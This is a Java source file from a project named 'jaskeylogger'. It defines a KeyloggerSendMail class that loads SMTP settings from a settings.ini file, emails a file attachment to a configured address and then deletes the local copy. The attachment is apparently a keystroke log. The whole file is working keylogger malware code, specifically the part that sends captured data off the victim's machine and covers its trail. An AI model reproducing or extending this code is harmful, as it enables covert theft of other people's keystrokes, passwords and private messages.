/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.github.juliansantosinfo.jaskeylogger;

import java.io.File;
import com.github.juliansantosinfo.email.Email;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.apache.commons.mail.EmailException;

/**
 *
 * @author Julian Santos
 */
public class KeyloggerSendMail extends Email implements Runnable {

    private final File attachment;

    public KeyloggerSendMail(File attachment) {
        this.attachment = attachment;
    }

    @Override
    public void run() {

        // Initialize variables.
        super.setHostName("");
        super.setSmtpPort(0);
        super.setUserName("");
        super.setPassword("");
        super.setFrom("");
        super.setTo("");
        super.setSubject("Subject to E-mail");
        super.setMsg("Body of the message.");
        super.setSslOnConnect(true);
        super.setTslOnConnect(false);

        // Loads information for sending emails.
        if (!KeyloggerSettings.loadEmailSettings(this)) {
            System.out.println(this.getClass().getName() + "|" + "Failed to load file (settings.ini)!");
            return;
        }

        try {
            // Send email.
            if (sendMailWithAttachments(attachment)) {
                attachment.delete();
            }
        } catch (EmailException ex) {
            Logger.getLogger(KeyloggerSendMail.class.getName()).log(Level.SEVERE, null, ex);
        }

    }

}
